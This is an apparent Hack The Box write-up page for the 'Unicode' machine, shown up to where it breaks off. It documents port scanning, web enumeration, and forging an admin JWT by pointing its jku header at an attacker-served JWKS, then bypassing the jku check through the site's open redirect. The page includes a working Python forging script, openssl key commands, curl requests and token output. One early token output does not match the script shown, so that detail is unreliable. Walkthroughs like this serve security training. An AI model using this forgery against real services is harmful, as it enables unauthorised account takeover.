@@ -1,0 +1,429 @@
+<!doctype html><html lang=es><head><title>Unicode | 7Rocky</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="Hack The Box. Linux. Medium machine. This machine uses JWT tokens with JWKS and JKU that can be forged to arrive to a directory path traversal vulnerability that can be exploited using some Unicode bypassing. After that, there is a Python compiled binary that can be run with sudo and uses curl behind the hoods. Some JWT knowledge, path traversal and command injection bypassing techniques are needed to compromise this machine. This write-up uses a custom Python script to exploit a directory path traversal using JWT with JWKS"><meta itemprop=description content="Hack The Box. Linux. Medium machine. This machine uses JWT tokens with JWKS and JKU that can be forged to arrive to a directory path traversal vulnerability that can be exploited using some Unicode bypassing. After that, there is a Python compiled binary that can be run with sudo and uses curl behind the hoods. Some JWT knowledge, path traversal and command injection bypassing techniques are needed to compromise this machine. This write-up uses a custom Python script to exploit a directory path traversal using JWT with JWKS"><meta name=twitter:description content="Hack The Box. Linux. Medium machine. This machine uses JWT tokens with JWKS and JKU that can be forged to arrive to a directory path traversal vulnerability that can be exploited using some Unicode bypassing. After that, there is a Python compiled binary that can be run with sudo and uses curl behind the hoods. Some JWT knowledge, path traversal and command injection bypassing techniques are needed to compromise this machine. This write-up uses a custom Python script to exploit a directory path traversal using JWT with JWKS"><meta property="og:description" content="Hack The Box. Linux. Medium machine. This machine uses JWT tokens with JWKS and JKU that can be forged to arrive to a directory path traversal vulnerability that can be exploited using some Unicode bypassing. After that, there is a Python compiled binary that can be run with sudo and uses curl behind the hoods. Some JWT knowledge, path traversal and command injection bypassing techniques are needed to compromise this machine. This write-up uses a custom Python script to exploit a directory path traversal using JWT with JWKS"><meta name=robots content="index, follow"><meta name=author content="7Rocky"><meta name=twitter:author content="7Rocky"><meta property="og:author" content="7Rocky"><meta name=image content="https://7rocky.github.io/images/HTB/Unicode/Unicode.png"><meta name=twitter:image content="https://7rocky.github.io/images/HTB/Unicode/Unicode.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Unicode/Unicode.png"><meta property="og:site_name" content="7Rocky"><meta itemprop=name content="Unicode"><meta property="og:title" content="Unicode"><meta property="og:url" content="https://7rocky.github.io/en/htb/unicode/"><meta itemprop=keywords content="sudo,flask,nginx,python,open-redirect,password-reuse,jwt,command-injection,reversing,static-code-analysis,directory-path-traversal,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon><link href=/css/style.css rel=stylesheet><link href=/css/main.css rel=stylesheet><link href=/css/monokai-sublime.min.css rel=stylesheet><link href=/css/code.css rel=stylesheet><script src=/js/highlight.min.js></script>
+<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src=/js/htb.js></script></head><body class="ma0 production"><header style=position:sticky;top:0;z-index:9><div class=bg-black><nav class=ph4-ns role=navigation><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href=/en/ title=7Rocky>7Rocky</a><div class="flex-l items-center"><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href=/htb/unicode/ title=es><img alt=es height=30px src=/images/es.png style="border:4px solid#000;border-radius:100%" width=30px></a>
+<a class="link-transition lang link dib z-999 pt3 pt0-l" href title=en><img alt=en height=30px src=/images/en.png width=30px></a><ul class="pl0 ml3 mr3" style=line-height:30px><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/en/ctf/ title=CTF>CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/en/htb/ title=HTB>HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/en/imc/ title=IMC>IMC</a></li></ul><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class=pb7 role=main><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><aside aria-label=aside class="instapaper_ignoref b helvetica tracked">HTB</aside><div id=sharing class=mt3><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/unicode/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/unicode/&text=Unicode" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/en/htb/unicode/&title=Unicode" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Unicode</h1><time class="f6 mv4 dib tracked" datetime=2022-05-07T00:00:00+01:00>07 / 05 / 2022</time></header><div class=htb-image><img alt=Unicode src=/images/HTB/Unicode/Unicode.png></div><ul class="nested-links tags"><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/sudo title=sudo>sudo</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/flask title=Flask>Flask</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/nginx title=nginx>nginx</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/python title=Python>Python</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/open-redirect title="Open Redirect">Open Redirect</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/password-reuse title="Password reuse">Password reuse</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/jwt title="JSON Web Token">JSON Web Token</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/command-injection title="Command Injection">Command Injection</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/reversing title="Reverse Engineering">Reverse Engineering</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/static-code-analysis title="Static Code Analysis">Static Code Analysis</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/directory-path-traversal title="Directory Path Traversal">Directory Path Traversal</a></li></ul><aside aria-label=aside class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem><p class="f5 b mb3">Contents of this write-up</p><nav id=TableOfContents><ul><li><a href=#port-scanning>Port scanning</a></li><li><a href=#web-enumeration>Web enumeration</a></li><li><a href=#forging-a-jwt-token>Forging a JWT token</a></li><li><a href=#exploiting-a-directory-path-traversal>Exploiting a Directory Path Traversal</a></li><li><a href=#system-enumeration>System enumeration</a></li><li><a href=#reversing-treport-to-python-code>Reversing <code>treport</code> to Python code</a></li><li><a href=#privilege-escalation-with-sudo>Privilege escalation with <code>sudo</code></a></li></ul></nav></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>OS</strong>: Linux</li><li><strong>Difficulty</strong>: Medium</li><li><strong>IP Address</strong>: 10.10.11.126</li><li><strong>Release</strong>: 27 / 11 / 2021</li></ul><h2 id=port-scanning>Port scanning</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.126 -p 22,80
+</span></span><span style=display:flex><span>Nmap scan report for 10.10.11.126
+</span></span><span style=display:flex><span>Host is up (0.057s latency).
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
+</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span></span><span style=display:flex><span>| ssh-hostkey:
+</span></span><span style=display:flex><span>|   3072 fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 (RSA)
+</span></span><span style=display:flex><span>|   256 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 (ECDSA)
+</span></span><span style=display:flex><span>|_  256 c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c (ED25519)
+</span></span><span style=display:flex><span>80/tcp open  http    nginx 1.18.0 (Ubuntu)
+</span></span><span style=display:flex><span>|_http-title: 503
+</span></span><span style=display:flex><span>|_http-trane-info: Problem with XML parsing of /evox/about
+</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0 (Ubuntu)
+</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span># Nmap done -- 1 IP address (1 host up) scanned in 10.27 seconds
+</span></span></code></pre></div><p>This machine has ports 22 (SSH) and 80 (HTTP) open.</p><h2 id=web-enumeration>Web enumeration</h2><p>If we go to <code>http://10.10.11.126</code> we will see a page like this:</p><p><img src=/images/HTB/Unicode/Unicode-index.png alt="Unicode index"></p><p>We notice that there is a redirect feature (the button that says &ldquo;Google about us&rdquo;):</p><p><img src=/images/HTB/Unicode/Unicode-redirect.png alt="Unicode redirect"></p><p>We can also register a new account going to <code>/register/</code>:</p><p><img src=/images/HTB/Unicode/Unicode-register.png alt="Unicode register"></p><p>Then we can log in going to <code>/login/</code> and access our dashboard in <code>/dashboard/</code>.</p><p><img src=/images/HTB/Unicode/Unicode-dashboard.png alt="Unicode dashboard"></p><p>If we try to register an account as <code>admin</code>, we will see that this user already exists:</p><p><img src=/images/HTB/Unicode/Unicode-admin-exists.png alt="Unicode admin exists"></p><p>If we examine the cookie set by the server, we see that it is a JWT token. The contents of this token can be easily shown in <a href=https://jwt.io>jwt.io</a>:</p><p><img src=/images/HTB/Unicode/Unicode-jwt.png alt="Unicode JWT"></p><p>Here we have a weird JWT claim (that is, a key-value pair in the header section). The key <code>jku</code> is not a common one. We see the domain <code>hackmedia.htb</code>, so we can add it to <code>/etc/hosts</code> pointing to <code>10.10.11.126</code>.</p><p>Now, we can request <code>http://hackmedia.htb/static/jwks.json</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> -s hackmedia.htb/static/jwks.json | <span class=code-dark-green>jq</span>
+{
+  <span class=code-blue>"keys"</span>: [
+    {
+      <span class=code-blue>"kty"</span>: <span class=code-dark-green>"RSA"</span>,
+      <span class=code-blue>"use"</span>: <span class=code-dark-green>"sig"</span>,
+      <span class=code-blue>"kid"</span>: <span class=code-dark-green>"hackthebox"</span>,
+      <span class=code-blue>"alg"</span>: <span class=code-dark-green>"RS256"</span>,
+      <span class=code-blue>"n"</span>: <span class=code-dark-green>"AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs"</span>,  
+      <span class=code-blue>"e"</span>: <span class=code-dark-green>"AQAB"</span>
+    }
+  ]
+}
+</code></pre></div><p>This is a JSON Web Key Set (JWKS). It is used to store the RSA public key that verifies a JWT token, because the token was signed with the corresponding RSA private key when it was created.</p><h2 id=forging-a-jwt-token>Forging a JWT token</h2><p>The idea is simple, first we create RSA private and public keys. Then, we can generate a JWKS with the public key and expose it using a web server. After that, we can forge a JWT token using <code>admin</code> as user and a <code>jku</code> value that points to our JWKS and sign the token with our private key.</p><p>Finally, the victim machine will receive the forged JWT and to verify it, the server will take our JWKS and do the verification successfully.</p><p>For that purpose, we can make use of a Python script like this one:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>python3</span>
+
+<span class=mtk5>import</span> <span class="mtk8 mtku">base64</span>
+<span class=mtk5>import</span> <span class="mtk8 mtku">json</span>
+<span class=mtk5>import</span> <span class="mtk8 mtku">jwt</span>
+<span class=mtk5>import</span> <span class="mtk8 mtku">sys</span>
+
+<span class=mtk5>from</span> <span class="mtk8 mtku">Crypto</span><span class=mtk1>.</span><span class="mtk8 mtku">PublicKey</span> <span class=mtk5>import</span> <span class="mtk8 mtku">RSA</span>
+<span class=mtk5>from</span> <span class="mtk8 mtku">Crypto</span><span class=mtk1>.</span><span class="mtk8 mtku">Util</span><span class=mtk1>.</span><span class="mtk8 mtku">number</span> <span class=mtk5>import</span> <span class=mtk8>long_to_bytes</span>
+
+<span class=mtk5>from</span> <span class="mtk8 mtku">http</span><span class=mtk1>.</span><span class="mtk8 mtku">server</span> <span class=mtk5>import</span> <span class="mtk8 mtku">HTTPServer</span><span class=mtk1>,</span> <span class="mtk8 mtku">SimpleHTTPRequestHandler</span>
+
+<span class=mtk1>privkey</span> <span class=mtk5>=</span> <span class=mtk8>open</span><span class=mtk1>(</span><span class=mtk4>'priv.key'</span><span class=mtk1>).</span><span class=mtk8>read</span><span class=mtk1>()</span>
+<span class=mtk1>pubkey</span> <span class=mtk5>=</span> <span class="mtk8 mtku">RSA</span><span class=mtk1>.</span><span class=mtk1>import_key</span><span class=mtk1>(</span><span class=mtk8>open</span><span class=mtk1>(</span><span class=mtk4>'pub.key'</span><span class=mtk1>).</span><span class=mtk8>read</span><span class=mtk1>())</span>
+
+
+<span class="mtk7 mtki">def</span> <span class=mtk8>int_to_b64</span><span class=mtk1>(</span><span class="mtk9 mtki">x</span><span class=mtk1>:</span> <span class="mtk8 mtku">str</span> <span class=mtk5>|</span> <span class="mtk8 mtku">int</span><span class=mtk1>)</span> <span class=mtk1>-&gt;</span> <span class="mtk8 mtku">str</span><span class=mtk1>:</span>
+    <span class=mtk5>return</span> <span class="mtk8 mtku">base64</span><span class=mtk1>.</span><span class=mtk8>urlsafe_b64encode</span><span class=mtk1>(</span><span class=mtk8>long_to_bytes</span><span class=mtk1>(</span><span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class="mtk9 mtki">x</span><span class=mtk1>))).</span><span class=mtk8>decode</span><span class=mtk1>()</span>  
+
+
+<span class="mtk7 mtki">def</span> <span class=mtk8>generate_jwks</span><span class=mtk1>():</span>
+    <span class="mtk8 mtku">json</span><span class=mtk1>.</span><span class=mtk8>dump</span><span class=mtk1>({</span><span class=mtk4>'keys'</span><span class=mtk1>:</span> <span class=mtk1>[{</span>
+        <span class=mtk4>'kty'</span><span class=mtk1>:</span> <span class=mtk4>'RSA'</span><span class=mtk1>,</span>
+        <span class=mtk4>'kid'</span><span class=mtk1>:</span> <span class=mtk4>'hackthebox'</span><span class=mtk1>,</span>
+        <span class=mtk4>'use'</span><span class=mtk1>:</span> <span class=mtk4>'sig'</span><span class=mtk1>,</span>
+        <span class=mtk4>'alg'</span><span class=mtk1>:</span> <span class=mtk4>'RS256'</span><span class=mtk1>,</span>
+        <span class=mtk4>'e'</span><span class=mtk1>:</span> <span class=mtk8>int_to_b64</span><span class=mtk1>(</span><span class=mtk1>pubkey</span><span class=mtk1>.</span><span class=mtk1>e</span><span class=mtk1>),</span>
+        <span class=mtk4>'n'</span><span class=mtk1>:</span> <span class=mtk8>int_to_b64</span><span class=mtk1>(</span><span class=mtk1>pubkey</span><span class=mtk1>.</span><span class=mtk1>n</span><span class=mtk1>)</span>
+    <span class=mtk1>}]},</span> <span class=mtk8>open</span><span class=mtk1>(</span><span class=mtk4>'jwks.json'</span><span class=mtk1>,</span> <span class=mtk4>'w'</span><span class=mtk1>),</span> <span class="mtk9 mtki">indent</span><span class=mtk5>=</span><span class=mtk6>2</span><span class=mtk1>)</span>
+
+
+<span class="mtk7 mtki">def</span> <span class=mtk8>main</span><span class=mtk1>():</span>
+    <span class=mtk8>generate_jwks</span><span class=mtk1>()</span>
+
+    <span class=mtk1>ip</span> <span class=mtk5>=</span> <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>]</span>
+    <span class=mtk1>jku</span> <span class=mtk5>=</span> <span class="mtk7 mtki">f</span><span class=mtk4>'</span><span class="mtk4 detected-link">http://</span><span class="mtk6 detected-link">{</span><span class="mtk1 detected-link">ip</span><span class=mtk6>}</span><span class=mtk4>/jwks.json'</span>
+    <span class=mtk1>token</span> <span class=mtk5>=</span> <span class="mtk8 mtku">jwt</span><span class=mtk1>.</span><span class=mtk1>encode</span><span class=mtk1>({</span><span class=mtk4>'user'</span><span class=mtk1>:</span> <span class=mtk4>'asdf'</span><span class=mtk1>},</span> <span class=mtk1>privkey</span><span class=mtk1>,</span>
+                       <span class="mtk9 mtki">algorithm</span><span class=mtk5>=</span><span class=mtk4>'RS256'</span><span class=mtk1>,</span>
+                       <span class="mtk9 mtki">headers</span><span class=mtk5>=</span><span class=mtk1>{</span><span class=mtk4>'jku'</span><span class=mtk1>:</span> <span class=mtk1>jku</span><span class=mtk1>})</span>
+
+    <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk4>'[+]</span> <span class=mtk4>JWT</span> <span class=mtk4>token:'</span><span class=mtk1>,</span> <span class=mtk1>token</span><span class=mtk1>)</span>
+
+    <span class="mtk8 mtku">HTTPServer</span><span class=mtk1>((</span><span class=mtk4>''</span><span class=mtk1>,</span> <span class=mtk6>80</span><span class=mtk1>),</span> <span class="mtk8 mtku">SimpleHTTPRequestHandler</span><span class=mtk1>).</span><span class=mtk8>serve_forever</span><span class=mtk1>()</span>
+
+
+<span class=mtk5>if</span> <span class=mtk1>__name__</span> <span class=mtk5>==</span> <span class=mtk4>'__main__'</span><span class=mtk1>:</span>
+    <span class=mtk8>main</span><span class=mtk1>()</span>
+</code></pre></div><p>Before running the script, we need to generate RSA private and public keys. We can use <code>openssl</code> for that:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>openssl</span> genrsa -out priv.key 1024
+Generating RSA private key, 1024 bit long modulus
+.........................................................................................................................++++++  
+...++++++
+e is 65537 (0x10001)
+
+<span class=code-cyan>$</span> <span class=code-dark-green>openssl</span> rsa -in <span class=mtku>priv.key</span> -pubout &gt; pub.key
+writing RSA key
+</code></pre></div><p>To generate the JWKS, we have to extract <code>n</code> and <code>e</code> from the public key (this is done in Python with <code>Crypto.PublicKey.RSA</code>) and then encode them in Base64. Then, these values and other data are stored into a JSON file called <code>jwks.json</code>.</p><p>Then we generate the forged JWT using the RSA private key and putting the URL to <code>jwks.json</code> as <code>jku</code> in the header.</p><p>If we run the script, we will see the JWT token and a web server will be started to serve <code>jwks.json</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>jwks.py</span> 10.10.17.44
+[+] JWT token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE3LjQ0L2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.OFeVvgtLOIp2u2Gd-LUrPFsTTCq3LvoDTRW98vZWuy2BfcKz4PuXoCIRKX2Rcbnnb6BDBX3UkL7FPa0XhIcw3Y_ASgEGJQWJdzjPWASwtFj_oTDKIlFz0HhgrvHPTM8Mn_t9D164vrPtHnk_w8rjzX5ZLQ5XnRDra8gusgqXK2s  
+</code></pre></div><p>Then, we can use <code>curl</code> to check if the JWT token is valid:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> hackmedia.htb/dashboard/ -H <span class=code-dark-yellow>'Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly8xMC4xMC4xNy40NC9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.ba9qYIw2E8ynYq1OPnZ4gDoSOtxpFZMivvgr8YqN7AXuPE1kw4mpEwYoNyPvoH3dAcnVRjkzytaQGvtYuYT8oXHZMrlZ3uN0p76e86p5Crr4tyYk1D4o8GT0KpCY6ABlcxChxonLGH5S3GqqnJ2wqrojoeThJ-CDrJFQM2ggSWI'</span>  
+jku validation failed
+</code></pre></div><p>And the server says that the <code>jku</code> field is invalid. Moreover, we do not receive any requests on the Python server output. The machine must have applied some filtering.</p><p>Here we can recall that there was a redirect feature in the website. If the machine is only allowing <code>jku</code> that start with <code>http://hackmedia.htb</code>, then it can be easily bypassed using the redirect feature (Open Redirect). We can change the <code>jku</code> value in the Python script as follows:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk8>+ jku = f'http://hackmedia.htb/redirect?url={ip}/jwks.json'</span>  
+<span class=mtk5>- jku = f'http://{ip}/jwks.json'</span>
+</code></pre></div><p>We run the script again:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>jwks.py</span> 10.10.17.44
+[+] JWT token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3JlZGlyZWN0Lz91cmw9MTAuMTAuMTcuNDQvandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4ifQ.cWE5m9Vb9f7PoReY7XjyfRhU-Jrv23yw8C3uum8mVezJCFPeLEBbf030EXrprcGjZjzH4x_I8P9v7NNjAHiVG8bm0JG7BEyE4wjUhtNVTnoiaHnpmbIxvZkZ4UIVmdO4rvVOQYCjIgD4gcoMi2dWF6Az1EbKI1pqJKZypxU4MwM  
